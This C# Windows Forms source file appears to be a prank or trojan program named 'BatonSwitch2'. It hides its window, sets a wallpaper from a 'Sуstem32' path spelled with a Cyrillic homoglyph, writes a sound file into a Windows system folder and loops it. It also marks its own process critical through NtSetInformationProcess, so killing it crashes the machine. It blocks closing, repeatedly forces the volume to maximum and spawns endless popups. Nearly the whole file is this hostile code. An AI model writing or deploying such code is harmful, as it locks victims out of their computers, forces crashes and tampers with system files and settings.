using Microsoft.Win32;
using run;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace BatonSwitch2
{
    public partial class main : Form
    {
        public main()
        {
            InitializeComponent();
        }
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtSetInformationProcess(IntPtr Handle, int p1, ref int p2, int p3);
        int isCritical = 1;
        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo
            (int uAction, int uParam, string lpvParam, int fuWinIni);

        private static void SetWallpaper(string path, int style, int tile)
        {
            RegistryKey Key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
            Key.SetValue("WallpaperStyle", style.ToString());
            Key.SetValue("TileWallpaper", tile.ToString());
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path,
            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Process.EnterDebugMode();
            SetWallpaper("C:\\Windows\\Sуstem32\\wall1.jpg", 2, 0);
            this.Hide();
            string path = "C:\\Windows\\ImmersiveControlPanel\\pris\\twitch.wav";
            if (!File.Exists(path))
            {
                File.WriteAllBytes(path, run.Properties.Resources.song);
            }
            SoundPlayer s = new SoundPlayer();
            s.SoundLocation = path;
            s.PlayLooping();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Form2 f = new Form2();
            f.Show();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            this.Hide();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
            
        }

        private void main_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            try
            {
                Process.Start("nircmd.exe", "mutesysvolume 0");
                Process.Start("nircmd.exe", "setsysvolume 65535");
            }
            catch { }
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            try
            {
                popup popup = new popup();
                popup.Show();
            }
            catch { }
        }
    }
}
